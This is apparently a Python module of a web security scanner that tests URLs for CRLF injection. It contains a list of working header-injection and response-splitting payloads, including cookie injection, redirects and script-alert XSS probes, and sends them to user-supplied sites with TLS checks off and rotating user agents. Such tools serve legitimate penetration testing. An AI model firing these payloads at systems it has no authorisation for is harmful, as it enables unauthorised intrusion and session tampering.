def crlf(): 
    try:
        from report import USER_AGENTS, clear_screen, generate_html_report, save_html_report
        import os
        import requests
        from flask import session
        import sys
        from urllib.parse import urlsplit
        from urllib.parse import urlunsplit
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from curses import panel
        import random
        import re
        from wsgiref import headers
        from colorama import Fore, Style, init
        from time import sleep
        from rich import print as rich_print
        from rich.panel import Panel
        from rich.table import Table
        from urllib.parse import urlparse
        import urllib3
        from prompt_toolkit import prompt
        from prompt_toolkit.completion import PathCompleter
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        import time
        from concurrent.futures import ThreadPoolExecutor
        from rich.panel import Panel

    except ImportError as e:
        print(f"Error: Required module is missing: {e.name}. Please install it using 'pip install {e.name}'")
        sys.exit(0)

    def run_crlf_scanner(scan_state=None):
        init(autoreset=True)

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        def get_domain(url):
            parsed_url = urlparse(url)
            return parsed_url.netloc

        def generate_payloads(url):
            domain = get_domain(url)
            base_payloads = [
                "/%%0a0aSet-Cookie:loxs=injected",
                "/%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%0d%0aLocation: http://loxs.pages.dev",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
                "/%0d%0aLocation: loxs.pages.dev",
                "/%0d%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
                "/%23%0aSet-Cookie:loxs=injected",
                "/%25%30%61Set-Cookie:loxs=injected",
                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
                "/%5Cr%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%u000ASet-Cookie:loxs=injected;",
                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
            ]
            
            return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]

        REGEX_PATTERNS = [
            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
        ]

        def get_random_user_agent():
            return random.choice(USER_AGENTS)

        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
            session = requests.Session()
            retry = Retry(
                total=retries,
                read=retries,
                connect=retries,
                backoff_factor=backoff_factor,
                status_forcelist=status_forcelist,
            )
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            return session

        def check_crlf_vulnerability(url, payload):
            payloads = generate_payloads(url)
            target_url = f"{url}{payload}"
            start_time = time.time()

            headers = {
                'User-Agent': get_random_user_agent(),
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            }

            try:
                session = get_retry_session()
                response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
                response_time = time.time() - start_time

                is_vulnerable = False
                vulnerability_details = []
                suspicious_headers = []
                suspicious_body_patterns = []

                for header, value in response.headers.items():
                    if any(re.fullmatch(pattern, f"{header}: {value}", re.IGNORECASE) for pattern in REGEX_PATTERNS):
                        is_vulnerable = True
                        vulnerability_details.append(f"{Fore.WHITE}Header Injection: {Fore.LIGHTBLACK_EX}{header}: {value}")
                    elif 'Set-Cookie' in header and 'loxs=injected' in value:
                        suspicious_headers.append(f"{header}: {value}")

                if any(re.fullmatch(pattern, response.text, re.IGNORECASE) for pattern in REGEX_PATTERNS):
                    is_vulnerable = True
                    vulnerability_details.append(f"{Fore.WHITE}Body Injection: {Fore.LIGHTBLACK_EX}Detected CRLF in response body")
                elif any(tag in response.text for tag in ["<script>", "<svg", "alert(", "Location:", "Content-Type:"]):
                    suspicious_body_patterns.append("Potentially suspicious script or tag content detected.")

                if response.status_code in [200, 201, 202, 204, 205, 206, 207, 301, 302, 307, 308]:
                    if is_vulnerable:
                        result = Fore.GREEN + f"[✓] {Fore.CYAN}Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
                        if vulnerability_details:
                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(vulnerability_details)
                    else:
                        result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"

                    if suspicious_headers or suspicious_body_patterns:
                        result += Fore.YELLOW + f"\n[!] Suspicious Patterns Found:\n"
                        if suspicious_headers:
                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(suspicious_headers)
                        if suspicious_body_patterns:
                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(suspicious_body_patterns)

                else:
                    result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"

                if scan_state:
                    scan_state['total_scanned'] += 1
                    if is_vulnerable:
                        scan_state['vulnerability_found'] = True
                        scan_state['vulnerable_urls'].append(target_url)
                        scan_state['total_found'] += 1

                return result, is_vulnerable

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[!] Error accessing {target_url}: {str(e)}")
                return None, False


        def test_crlf(url, max_threads=5):
            found_vulnerabilities = 0
            vulnerable_urls = []
            payloads = generate_payloads(url)

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in payloads}
                for future in as_completed(future_to_payload):
                    payload = future_to_payload[future]
                    try:
                        result, is_vulnerable = future.result()
                        if result:
                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload}")
                            print(result)
                            if is_vulnerable:
                                found_vulnerabilities += 1
                                vulnerable_urls.append(url + payload)
                    except Exception as e:
                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
            return found_vulnerabilities, vulnerable_urls

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"
            
            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
            if generate_report == 'y':
                html_content = generate_html_report("Carriage Return Line Feed Injection (CRLF)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
                filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
                report_file = save_html_report(html_content, filename)

            else:
                print(Fore.RED + "[!] Invalid option. Exiting the program.")
                sys.exit(0)

        def get_file_path(prompt_text):
            return prompt(prompt_text, completer=PathCompleter())

        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                            input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                            clear_screen()
                            print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                    clear_screen()
                    print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
        
        clear_screen()
        panel = Panel(
        r"""
   __________  __    ______
  / ____/ __ \/ /   / ____/  ______________ _____  ____  ___  _____
 / /   / /_/ / /   / /_     / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
/ /___/ _, _/ /___/ __/    (__  ) /__/ /_/ / / / / / / /  __/ /
\____/_/ |_/_____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/

        """,
        style="bold green",
        border_style="blue",
        expand=False
        )
        rich_print(panel, "\n")

        print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")

        urls = prompt_for_urls()
        
        max_threads = 10

        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
        time.sleep(1)
        clear_screen()
        print(Fore.CYAN + "[i] Starting scan...\n")

        total_found = 0
        total_scanned = 0
        start_time = time.time()
        vulnerable_urls = []

        if scan_state is None:
            scan_state = {
                'vulnerability_found': False,
                'vulnerable_urls': [],
                'total_found': 0,
                'total_scanned': 0
            }

        for url in urls:
            box_content = f" → Scanning URL: {url} "
            box_width = max(len(box_content) + 2, 40)
            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")

            found, urls_with_payloads = test_crlf(url, max_threads)
            total_found += found
            total_scanned += len(generate_payloads(url))
            vulnerable_urls.extend(urls_with_payloads)

        print_scan_summary(total_found, total_scanned, start_time)
        save_results(vulnerable_urls, total_found, total_scanned, start_time)

        print(Fore.RED + "\nExiting...")
        sys.exit(0)

    run_crlf_scanner()
crlf()